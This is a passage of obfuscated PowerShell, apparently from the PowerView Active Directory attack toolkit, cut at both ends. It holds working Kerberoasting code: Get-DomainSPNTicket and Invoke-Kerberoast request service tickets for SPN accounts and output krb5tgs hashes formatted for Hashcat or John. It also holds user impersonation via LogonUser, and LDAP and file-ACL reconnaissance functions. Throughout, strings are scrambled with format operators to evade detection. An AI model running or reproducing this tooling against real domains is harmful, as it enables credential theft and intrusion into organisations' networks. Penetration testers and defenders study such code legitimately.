                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function Invoke-UserImpersonation {


    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = {"{2}{1}{0}"-f'ial','ent','Cred'})]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = "c`R`EDeNtIAL")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = "TO`K`en`hanDLE")]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters[("{1}{0}"-f't','Quie')])) {
        Write-Warning ("{27}{38}{7}{3}{23}{31}{26}{29}{19}{34}{33}{10}{9}{37}{18}{5}{2}{11}{16}{24}{17}{22}{4}{25}{6}{28}{30}{13}{14}{21}{0}{15}{32}{8}{12}{1}{20}{36}{35}" -f'i','t','h','serIm','t ','ngle-t','t','e-U',' ','y in a','ntl','re','no','p','erso','on ','a','ed apartme','i','e',' w','nat','n','perso','d','s','ion] ','[Invo','ate, token i','powershell.','m','nat','may','s not curre','xe i','k.','or',' s','k')
    }

    if ($PSBoundParameters[("{2}{3}{1}{0}"-f 'dle','enHan','T','ok')]) {
        $LogonTokenHandle = $TokenHandle
    }
    else {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        $UserName = $NetworkCredential.UserName
        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        
        
        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not $Result) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    
    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)

    if (-not $Result) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    Write-Verbose ("{5}{20}{9}{8}{6}{18}{7}{2}{14}{12}{3}{16}{0}{19}{4}{1}{17}{21}{13}{15}{10}{11}"-f'i','c',' Alt','e',' su','[','Imp','nation]','User','oke-','personat','ed','r','sful','ernate c','ly im','dent','ce','erso','als','Inv','s')
    $LogonTokenHandle
}


function Invoke-RevertToSelf {


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    if ($PSBoundParameters[("{0}{1}{3}{2}"-f'TokenH','a','dle','n')]) {
        Write-Warning ("{1}{7}{4}{0}{13}{2}{8}{6}{12}{5}{9}{11}{14}{3}{10}" -f'g tok','[Invoke-RevertToSelf] Re','n imper','o','rtin','n and closing','nati','ve','so',' Logon','ken handle','Us','o','e','er() t')
        $Result = $Kernel32::CloseHandle($TokenHandle)
    }

    $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not $Result) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    Write-Verbose ("{2}{7}{4}{5}{9}{3}{1}{0}{8}{6}" -f 'c','personation su','[Invo','Self] Token im','e-','Re',' reverted','k','cessfully','vertTo')
}


function Get-DomainSPNTicket {


    [OutputType({"{5}{2}{0}{4}{3}{1}"-f'werView.','icket','o','PNT','S','P'})]
    [CmdletBinding(DefaultParameterSetName = {"{1}{0}" -f'wSPN','Ra'})]
    Param (
        [Parameter(Position = 0, ParameterSetName = "R`AWspn", Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern({"{0}{1}"-f'.','*/.*'})]
        [Alias({"{1}{2}{3}{0}"-f 'me','ServiceP','rincipalN','a'})]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = "u`SeR", Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq ("{2}{0}{3}{1}" -f'e','View.User','Pow','r') })]
        [Object[]]
        $User,

        [ValidateSet({"{1}{0}" -f 'n','Joh'}, {"{2}{1}{0}"-f'hcat','as','H'})]
        [Alias({"{0}{1}" -f'Forma','t'})]
        [String]
        $OutputFormat = ("{0}{1}" -f 'Hash','cat'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName(("{1}{2}{0}{3}" -f 'ity','System.I','dent','Model'))

        if ($PSBoundParameters[("{1}{2}{0}" -f 'tial','Cre','den')]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters[("{0}{1}"-f 'Us','er')]) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }

        ForEach ($Object in $TargetObject) {
            if ($PSBoundParameters[("{1}{0}" -f'er','Us')]) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = ("{0}{1}" -f 'UNKNOW','N')
                $DistinguishedName = ("{1}{0}{2}" -f 'NOW','UNK','N')
            }

            
            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $UserSPN = $UserSPN[0]
            }

            try {
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            }
            catch {
                Write-Warning ('[Get'+'-Dom'+'a'+'i'+'nSPN'+'T'+'icket] '+'Erro'+'r '+'r'+'eques'+'t'+'ing '+'ticke'+'t'+' '+'fo'+'r '+'SP'+'N '+"'$UserSPN' "+'fro'+'m '+'u'+'ser '+"'$DistinguishedName' "+': '+"$_")
            }
            if ($Ticket) {
                $TicketByteStream = $Ticket.GetRequest()
            }
            if ($TicketByteStream) {
                $Out = New-Object PSObject

                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

                $Out | Add-Member Noteproperty ("{4}{3}{1}{2}{0}" -f'ame','Ac','countN','am','S') $SamAccountName
                $Out | Add-Member Noteproperty ("{4}{0}{2}{3}{1}" -f 'is','hedName','ti','nguis','D') $DistinguishedName
                $Out | Add-Member Noteproperty ("{4}{0}{1}{2}{3}" -f 'vicePri','n','cipalNa','me','Ser') $Ticket.ServicePrincipalName

                
                
                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

                    
                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne ("{0}{1}" -f 'A','482')) {
                        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                        $Hash = $null
                        $Out | Add-Member Noteproperty ("{2}{4}{0}{3}{1}"-f 're','m','Tick','a','etByteHexSt') ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                    } else {
                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        $Out | Add-Member Noteproperty ("{4}{1}{5}{2}{0}{3}"-f'exStrea','etBy','eH','m','Tick','t') $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                    $Hash = $null
                    $Out | Add-Member Noteproperty ("{3}{1}{0}{5}{2}{4}"-f 'ketByte','c','a','Ti','m','HexStre') ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                }

                if($Hash) {
                    
                    if ($OutputFormat -match ("{1}{0}" -f'n','Joh')) {
                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($DistinguishedName -ne ("{2}{1}{0}" -f 'N','NOW','UNK')) {
                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $UserDomain = ("{0}{2}{1}"-f'U','N','NKNOW')
                        }

                        
                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty ("{0}{1}"-f 'Has','h') $HashFormat
                }

                $Out.PSObject.TypeNames.Insert(0, ("{3}{4}{0}{1}{5}{2}" -f'erVi','ew.SP','et','Po','w','NTick'))
                $Out
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Invoke-Kerberoast {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{4}{0}{3}"-f'r','Shou','PS','ocess','ldP'}, '')]
    [OutputType({"{0}{3}{1}{2}"-f'Pow','ew.SPNTic','ket','erVi'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{3}{2}{1}{4}"-f'Distin','dN','uishe','g','ame'}, {"{0}{1}{3}{2}" -f 'SamAc','cou','me','ntNa'}, {"{1}{0}"-f'me','Na'}, {"{1}{5}{3}{0}{4}{2}"-f'nguished','M','e','i','Nam','emberDist'}, {"{0}{2}{1}" -f'Member','ame','N'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Filt','er'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f'SPa','th','AD'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{3}" -f'ainContr','Dom','oll','er'})]
        [String]
        $Server,

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{1}{0}{2}" -f've','OneLe','l'}, {"{0}{1}{2}" -f'Sub','tr','ee'})]
        [String]
        $SearchScope = ("{2}{0}{1}"-f 'e','e','Subtr'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [ValidateSet({"{1}{0}" -f 'ohn','J'}, {"{1}{0}"-f 'ashcat','H'})]
        [Alias({"{1}{0}"-f'mat','For'})]
        [String]
        $OutputFormat = ("{0}{2}{1}" -f'H','hcat','as'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserSearcherArguments = @{
            'SPN' = $True
            ("{2}{0}{1}" -f'roper','ties','P') = ("{9}{3}{4}{6}{8}{5}{10}{2}{11}{1}{7}{0}" -f'name','ipa','i','coun','tname,disting','hedna','ui','l','s','samac','me,servicepr','nc')
        }
        if ($PSBoundParameters[("{1}{0}" -f 'ain','Dom')]) { $UserSearcherArguments[("{0}{1}"-f 'Dom','ain')] = $Domain }
        if ($PSBoundParameters[("{2}{0}{1}"-f'AP','Filter','LD')]) { $UserSearcherArguments[("{1}{2}{0}"-f'APFilter','L','D')] = $LDAPFilter }
        if ($PSBoundParameters[("{0}{2}{1}"-f 'Se','chBase','ar')]) { $UserSearcherArguments[("{2}{0}{1}"-f'B','ase','Search')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}" -f 'Se','rver')]) { $UserSearcherArguments[("{1}{0}{2}" -f 've','Ser','r')] = $Server }
        if ($PSBoundParameters[("{1}{0}{2}"-f'hScop','Searc','e')]) { $UserSearcherArguments[("{0}{2}{3}{1}"-f'S','ope','ear','chSc')] = $SearchScope }
        if ($PSBoundParameters[("{0}{2}{3}{1}"-f 'Resu','ze','l','tPageSi')]) { $UserSearcherArguments[("{3}{2}{1}{0}"-f 'ize','S','sultPage','Re')] = $ResultPageSize }
        if ($PSBoundParameters[("{1}{0}{2}"-f 'erverT','S','imeLimit')]) { $UserSearcherArguments[("{0}{2}{1}{3}{4}"-f 'Serv','imeL','erT','im','it')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{2}{1}"-f'Tom','tone','bs')]) { $UserSearcherArguments[("{0}{2}{1}"-f'T','bstone','om')] = $Tombstone }
        if ($PSBoundParameters[("{2}{1}{0}" -f 'ential','red','C')]) { $UserSearcherArguments[("{1}{2}{0}" -f 'al','Cred','enti')] = $Credential }

        if ($PSBoundParameters[("{3}{2}{1}{0}"-f 'l','tia','en','Cred')]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters[("{2}{1}{0}"-f'ty','nti','Ide')]) { $UserSearcherArguments[("{1}{0}" -f 'entity','Id')] = $Identity }
        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne ("{1}{2}{0}" -f 'gt','k','rbt')} | Get-DomainSPNTicket -OutputFormat $OutputFormat
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-PathAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}"-f 'ldProce','ss','PSShou'}, '')]
    [OutputType({"{3}{2}{0}{1}" -f'ileA','CL','F','PowerView.'})]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{2}{1}{0}"-f'lName','ul','F'})]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function Convert-FileRight {
            
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )

            $AccessMask = @{
                [uint32]("{0}{2}{1}"-f '0x80','0','00000') = ("{1}{2}{0}" -f'cRead','G','eneri')
                [uint32]("{1}{2}{0}" -f'00','0x','400000') = ("{1}{0}{2}" -f'r','GenericW','ite')
                [uint32]("{0}{1}{2}"-f '0x200','0','0000') = ("{2}{0}{1}" -f 'cE','xecute','Generi')
                [uint32]("{1}{0}{2}"-f'x10','0','000000') = ("{0}{2}{1}"-f 'G','l','enericAl')
                [uint32]("{0}{1}{2}"-f'0x02','0','00000') = ("{1}{0}{2}{3}{4}"-f 'imu','Max','m','A','llowed')
                [uint32]("{2}{1}{0}"-f'00','000','0x010') = ("{4}{1}{2}{0}{3}"-f'emSecurit','cessS','yst','y','Ac')
                [uint32]("{2}{0}{1}"-f '0','100000','0x0') = ("{2}{0}{1}{3}"-f'c','hro','Syn','nize')
                [uint32]("{0}{1}{2}" -f '0x00','08','0000') = ("{0}{2}{1}{3}"-f 'Wr','O','ite','wner')
                [uint32]("{1}{2}{0}"-f '000','0x000','40') = ("{1}{0}"-f 'riteDAC','W')
                [uint32]("{0}{2}{1}"-f'0x0','00','00200') = ("{0}{1}{2}"-f 'Rea','dContro','l')
                [uint32]("{0}{1}{2}"-f'0x000','100','00') = ("{0}{1}"-f 'De','lete')
                [uint32]("{1}{2}{0}{3}"-f '000010','0','x0','0') = ("{2}{0}{1}{3}{4}" -f 'ri','b','WriteAtt','ute','s')
                [uint32]("{0}{2}{1}"-f '0x','0000080','0') = ("{0}{2}{1}" -f'Rea','Attributes','d')
                [uint32]("{0}{1}{2}" -f'0x','000','00040') = ("{0}{2}{1}"-f 'Delet','d','eChil')
                [uint32]("{0}{2}{1}" -f'0x','0020','0000') = ("{4}{1}{0}{3}{2}"-f'T','e/','averse','r','Execut')
                [uint32]("{1}{0}{2}{3}" -f '00','0x','0000','10') = ("{5}{1}{0}{2}{4}{3}{6}"-f 'teEx','ri','tendedA','tribu','t','W','tes')
                [uint32]("{2}{0}{1}" -f'00','8','0x00000') = ("{1}{4}{0}{2}{6}{5}{3}"-f 'Ex','Rea','t','Attributes','d','d','ende')
                [uint32]("{1}{0}{2}"-f'00','0x','000004') = ("{5}{4}{3}{1}{6}{0}{2}"-f 'or','dSubdirec','y','/Ad','ppendData','A','t')
                [uint32]("{0}{2}{1}"-f '0x','000002','00') = ("{0}{2}{3}{1}{4}" -f 'WriteDat','F','a','/Add','ile')
                [uint32]("{2}{1}{0}"-f'0001','00','0x00') = ("{0}{1}{3}{2}{4}"-f'Read','D','or','ata/ListDirect','y')
            }

            $SimplePermissions = @{
                [uint32]("{1}{0}" -f 'f','0x1f01f') = ("{0}{1}{2}{3}" -f 'FullC','o','n','trol')
                [uint32]("{1}{0}"-f'f','0x0301b') = ("{0}{1}"-f'Modi','fy')
                [uint32]("{1}{2}{0}" -f'9','0x020','0a') = ("{2}{3}{0}{1}{4}" -f 'dAn','dExecut','Re','a','e')
                [uint32]("{0}{1}"-f '0x0201','9f') = ("{3}{0}{1}{2}" -f'eadAn','dWr','ite','R')
                [uint32]("{0}{1}{2}" -f'0x0','2008','9') = ("{0}{1}" -f'R','ead')
                [uint32]("{2}{0}{1}" -f'001','16','0x0') = ("{0}{1}" -f 'Wri','te')
            }

            $Permissions = @()

            
            $Permissions += $SimplePermissions.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $SimplePermissions[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }

            
            $Permissions += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($Permissions | Where-Object {$_}) -join ','
        }

        $ConvertArguments = @{}
        if ($PSBoundParameters[("{2}{1}{0}"-f'l','tia','Creden')]) { $ConvertArguments[("{1}{2}{0}" -f'al','Cred','enti')] = $Credential }

        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            try {
                if (($TargetPath -Match ((("{1}{3}{4}{0}{2}"-f '0j','G','.*G0jG0j.*','0jG0jG0j','G')).REPlaCE(([cHAR]71+[cHAR]48+[cHAR]106),[String][cHAR]92))) -and ($PSBoundParameters[("{3}{0}{1}{2}"-f'e','nti','al','Cred')])) {
                    $HostComputer = (New-Object System.Uri($TargetPath)).Host
                    if (-not $MappedComputers[$HostComputer]) {
                        
                        Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                        $MappedComputers[$HostComputer] = $True
                    }
                }

                $ACL = Get-Acl -Path $TargetPath

                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = ConvertFrom-SID -ObjectSID $SID @ConvertArguments

                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty ("{1}{0}"-f 'ath','P') $TargetPath
                    $Out | Add-Member Noteproperty ("{4}{3}{1}{2}{0}"-f 'Rights','ste','m','Sy','File') (Convert-FileRight -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty ("{2}{1}{3}{0}" -f'e','dentityRef','I','erenc') $Name
                    $Out | Add-Member Noteproperty ("{0}{2}{1}"-f 'Iden','D','titySI') $SID
                    $Out | Add-Member Noteproperty ("{3}{2}{0}{1}"-f'ol','Type','ontr','AccessC') $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, ("{0}{4}{2}{5}{1}{3}"-f'Pow','w.File','i','ACL','erV','e'))
                    $Out
                }
            }
            catch {
                Write-Verbose ('['+'Get-P'+'at'+'hA'+'cl] '+'error'+': '+"$_")
            }
        }
    }

    END {
        
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


function Convert-LDAPProperty {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{1}"-f 'ld','Process','P','SShou'}, '')]
    [OutputType({"{10}{2}{5}{9}{1}{7}{0}{6}{4}{8}{3}" -f'n.','gement.Aut','tem','ject','SCust','.','P','omatio','omOb','Mana','Sys'})]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if ($_ -ne ("{1}{0}" -f 'dspath','a')) {
            if (($_ -eq ("{1}{2}{0}"-f 'ctsid','obj','e')) -or ($_ -eq ("{3}{0}{1}{2}" -f 's','tor','y','sidhi'))) {
                
                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq ("{1}{2}{0}"-f 'e','g','rouptyp')) {
                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
            }
            elseif ($_ -eq ("{4}{3}{0}{2}{1}" -f 'ount','e','typ','acc','sam')) {
                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
            }
            elseif ($_ -eq ("{0}{2}{3}{1}"-f'ob','guid','jec','t')) {
                
                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq ("{1}{2}{3}{0}{4}" -f 'r','u','seracc','ountcont','ol')) {
                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
            }
            elseif ($_ -eq ("{1}{6}{2}{4}{5}{0}{3}" -f 'pt','nt','urityd','or','es','cri','sec')) {
                
                $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if ($Descriptor.Owner) {
                    $ObjectProperties[("{1}{0}" -f 'r','Owne')] = $Descriptor.Owner
                }
                if ($Descriptor.Group) {
                    $ObjectProperties[("{1}{0}" -f 'p','Grou')] = $Descriptor.Group
                }
                if ($Descriptor.DiscretionaryAcl) {
                    $ObjectProperties[("{4}{3}{2}{0}{1}" -f'naryA','cl','etio','r','Disc')] = $Descriptor.DiscretionaryAcl
                }
                if ($Descriptor.SystemAcl) {
                    $ObjectProperties[("{0}{2}{1}" -f 'Sy','l','stemAc')] = $Descriptor.SystemAcl
                }
            }
            elseif ($_ -eq ("{3}{0}{2}{1}" -f'ccountexp','s','ire','a')) {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ObjectProperties[$_] = ("{1}{0}"-f 'ER','NEV')
                }
                else {
                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq ("{2}{1}{0}" -f'ogon','astl','l')) -or ($_ -eq ("{2}{3}{0}{1}{4}"-f'logonti','me','la','st','stamp')) -or ($_ -eq ("{0}{1}{2}" -f 'pw','dlast','set')) -or ($_ -eq ("{0}{1}{2}" -f'l','astlo','goff')) -or ($_ -eq ("{2}{4}{3}{1}{0}" -f 'e','rdTim','b','swo','adPas')) ) {
                
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    
                    $Temp = $Properties[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember(("{1}{0}{2}"-f'a','HighP','rt'), [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember(("{1}{0}"-f'art','LowP'),  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    
                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                
                $Prop = $Properties[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember(("{2}{0}{1}"-f'hPar','t','Hig'), [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember(("{0}{1}" -f'Low','Part'),  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose ('[Conve'+'rt-LDAP'+'Pr'+'operty]'+' '+'erro'+'r:'+' '+"$_")
                    $ObjectProperties[$_] = $Prop[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                $ObjectProperties[$_] = $Properties[$_][0]
            }
            else {
                $ObjectProperties[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $ObjectProperties
    }
    catch {
        Write-Warning ('['+'Conv'+'er'+'t-'+'LDA'+'PProper'+'ty] '+'Er'+'r'+'or '+'pa'+'rs'+'ing '+'LDAP'+' '+'prop'+'ertie'+'s '+': '+"$_")
    }
}








function Get-DomainSearcher {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}"-f 'PS','Shoul','ss','dProce'}, '')]
    [OutputType({"{8}{4}{7}{6}{3}{2}{10}{5}{1}{9}{0}"-f 'er','earc','t','c','em','S','yServices.Dire','.Director','Syst','h','ory'})]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'er','F','ilt'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'SPath','AD'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}{3}{4}"-f 'Dom','a','in','Controlle','r'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f 'se','Ba'}, {"{1}{0}" -f'vel','OneLe'}, {"{1}{0}"-f 'btree','Su'})]
        [String]
        $SearchScope = ("{0}{1}{2}"-f 'Subt','re','e'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,

        [ValidateSet({"{1}{0}" -f 'acl','D'}, {"{1}{0}" -f'roup','G'}, {"{1}{0}" -f'one','N'}, {"{0}{1}"-f 'O','wner'}, {"{1}{0}" -f 'cl','Sa'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters[("{0}{1}"-f 'Dom','ain')]) {
            $TargetDomain = $Domain

            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                
                $UserDomain = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                    $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif ($PSBoundParameters[("{0}{1}{2}{3}"-f 'C','red','enti','al')]) {
            
            $DomainObject = Get-Domain -Credential $Credential
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            
            $TargetDomain = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
                $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            
            write-verbose ("{0}{2}{3}{1}"-f'g','domain','et','-')
            $DomainObject = Get-Domain
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }

        if ($PSBoundParameters[("{0}{2}{1}"-f'Se','r','rve')]) {
            
            $BindServer = $Server
        }

        $SearchString = ("{1}{0}{2}"-f'DAP:','L','//')

        if ($BindServer -and ($BindServer.Trim() -ne '')) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += '/'
            }
        }

        if ($PSBoundParameters[("{0}{1}{3}{2}" -f 'S','earch','efix','BasePr')]) {
            $SearchString += $SearchBasePrefix + ','
        }

        if ($PSBoundParameters[("{0}{1}{2}"-f 'SearchBa','s','e')]) {
            if ($SearchBase -Match ("{0}{1}"-f '^GC:','//')) {
                
                $DN = $SearchBase.ToUpper().Trim('/')
                $SearchString = ''
            }
            else {
                if ($SearchBase -match ("{1}{0}"-f 'DAP://','^L')) {
                    if ($SearchBase -match ("{2}{1}{0}"-f 'AP://.+/.+','D','L')) {
                        $SearchString = ''
                        $DN = $SearchBase
                    }
                    else {
                        $DN = $SearchBase.SubString(7)
                    }
                }
                else {
                    $DN = $SearchBase
                }
            }
        }
        else {
            
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        $SearchString += $DN
        Write-Verbose ('['+'Ge'+'t'+'-Doma'+'inSea'+'rc'+'her] '+'sear'+'ch '+'ba'+'s'+'e: '+"$SearchString")

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose ("{3}{8}{10}{5}{11}{0}{2}{13}{9}{6}{4}{1}{7}{12}"-f 'g alte',' conn','rnate','[Get-Domai',' for LDAP',']','s','ec','nSearch','ial','er',' Usin','tion',' credent')
            
